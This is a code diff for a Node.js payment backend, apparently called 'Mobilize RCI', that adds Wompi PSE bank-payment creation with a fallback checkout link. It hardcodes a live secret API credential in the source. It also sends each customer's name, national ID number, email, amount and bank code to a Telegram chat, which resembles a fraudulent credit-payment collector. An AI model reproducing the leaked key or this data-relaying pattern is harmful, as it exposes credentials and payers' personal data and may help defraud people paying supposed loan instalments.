@@ -474,6 +474,78 @@ const HELPPIU_API  = 'https://helppiupay.com/api/v1';
 const HELPPIU_AUTH = 'Bearer hp_sk_live_Z9cxILagdjuaO1wXUCGq1qfS:1P94UirgtSEh44r1ZG1oLBRA1npStKcV4nrtERZLA0XDCJrd';
 let _hpBancos = null, _hpBancosTs = 0;
 
+// ── Wompi PSE (montos < $2.5M) ─────────────────────────────────────────────
+const WOMPI_API      = 'https://api.wompi.co/v1';
+const WOMPI_LINK_ID  = '6APLRa';
+let _wompiPubKey     = '';
+let _wompiPayLinkId  = '';
+
+async function ensureWompiKeys() {
+  if (_wompiPubKey) return;
+  const r = await axios.get(`${WOMPI_API}/payment_links/${WOMPI_LINK_ID}`, { timeout: 10_000 });
+  _wompiPubKey    = r.data.data.merchant_public_key;
+  _wompiPayLinkId = r.data.data.id;
+}
+
+async function wompiPsePagar({ monto, bancoCode, cedula, tipoPersona, nombre, email, telefono }) {
+  await ensureWompiKeys();
+
+  // Acceptance token (requerido por Wompi, público)
+  const mResp = await axios.get(`${WOMPI_API}/merchants/${_wompiPubKey}`, { timeout: 10_000 });
+  const acceptanceToken  = mResp.data.data.presigned_acceptance.acceptance_token;
+  const personalDataToken = mResp.data.data.presigned_personal_data_auth?.acceptance_token || acceptanceToken;
+
+  const ref = 'MOB' + Date.now();
+
+  const txResp = await axios.post(`${WOMPI_API}/transactions`, {
+    acceptance_token:     acceptanceToken,
+    accept_personal_auth: personalDataToken,
+    amount_in_cents:      monto * 100,
+    currency:             'COP',
+    customer_email:       email,
+    reference:            ref,
+    redirect_url:         'https://mobilize-1.onrender.com/pse-resultado',
+    payment_link_id:      _wompiPayLinkId,
+    payment_method: {
+      type:                       'PSE',
+      user_type:                  tipoPersona === '1' ? 1 : 0,
+      user_legal_id_type:         'CC',
+      user_legal_id:              String(cedula),
+      financial_institution_code: String(bancoCode),
+      payment_description:        'Pago crédito RCI',
+    },
+    customer_data: {
+      phone_number: String(telefono || '3000000000'),
+      full_name:    nombre,
+      legal_id:     String(cedula),
+      legal_id_type: 'CC',
+    },
+  }, {
+    headers: { Authorization: `Bearer ${_wompiPubKey}`, 'Content-Type': 'application/json' },
+    validateStatus: () => true,
+    timeout: 15_000,
+  });
+
+  if (txResp.status !== 201)
+    throw new Error(`Wompi ${txResp.status}: ${JSON.stringify(txResp.data).slice(0, 300)}`);
+
+  const txId = txResp.data.data.id;
+
+  // Polling hasta obtener async_payment_url (~1-3 s)
+  for (let i = 0; i < 5; i++) {
+    await new Promise(r => setTimeout(r, 1500));
+    const poll = await axios.get(`${WOMPI_API}/transactions/${txId}`, {
+      headers: { Authorization: `Bearer ${_wompiPubKey}` },
+      timeout: 10_000,
+      validateStatus: () => true,
+    });
+    const url = poll.data?.data?.payment_method?.extra?.async_payment_url;
+    if (url) return url;
+  }
+
+  throw new Error('Wompi no devolvió async_payment_url tras 5 intentos');
+}
+
 app.get('/api/pse/bancos', async (req, res) => {
   if (!allowed(ip(req), 20, 60_000))
     return res.status(429).json({ error: 'Demasiadas solicitudes.' });
@@ -511,19 +583,33 @@ app.post('/api/pse/generar', async (req, res) => {
   if (!/^\d{5,12}$/.test(String(cedula)))
     return res.status(400).json({ error: 'Cédula inválida.' });
 
-  // ── Montos < $2.500.000 → Wompi / Nequi Negocios ──────────────────────────
+  // ── Montos < $2.500.000 → Wompi PSE API directo al banco ─────────────────
   if (montoNum < 2_500_000) {
-    const wompiUrl = `https://checkout.nequi.wompi.co/l/6APLRa?amount-in-cents=${montoNum * 100}`;
-    await tgSend(
-      `🟡 <b>PSE → Wompi Nequi — Mobilize RCI</b>\n` +
-      `👤 <b>${nombre}</b>\n` +
-      `🪪 Cédula: <code>${cedula}</code>\n` +
-      `📧 ${email}\n` +
-      `💰 <b>COP ${fmtCOP(montoNum)}</b>\n` +
-      `ℹ️ Monto menor a $2.5M → redirigido a Wompi\n` +
-      `📅 ${new Date().toLocaleString('es-CO')}`
-    );
-    return res.json({ async_payment_url: wompiUrl });
+    try {
+      const pseUrl = await wompiPsePagar({ monto: montoNum, bancoCode, cedula, tipoPersona, nombre, email, telefono });
+      await tgSend(
+        `🟡 <b>PSE → Wompi PSE — Mobilize RCI</b>\n` +
+        `👤 <b>${nombre}</b>\n` +
+        `🪪 Cédula: <code>${cedula}</code>\n` +
+        `📧 ${email}\n` +
+        `💰 <b>COP ${fmtCOP(montoNum)}</b>\n` +
+        `🏛 Banco: <code>${bancoCode}</code>\n` +
+        `✅ URL banco obtenida\n` +
+        `📅 ${new Date().toLocaleString('es-CO')}`
+      );
+      return res.json({ async_payment_url: pseUrl });
+    } catch (wErr) {
+      console.error('[Wompi PSE] Error:', wErr.message);
+      // Fallback al checkout de Wompi si la API falla
+      const wompiUrl = `https://checkout.nequi.wompi.co/l/6APLRa?amount-in-cents=${montoNum * 100}`;
+      await tgSend(
+        `🟡 <b>PSE → Wompi checkout (fallback) — Mobilize RCI</b>\n` +
+        `👤 <b>${nombre}</b> | 💰 COP ${fmtCOP(montoNum)}\n` +
+        `⚠️ API falló: ${wErr.message.slice(0, 100)}\n` +
+        `📅 ${new Date().toLocaleString('es-CO')}`
+      );
+      return res.json({ async_payment_url: wompiUrl });
+    }
   }
 
   const ref = 'CON' + Date.now();
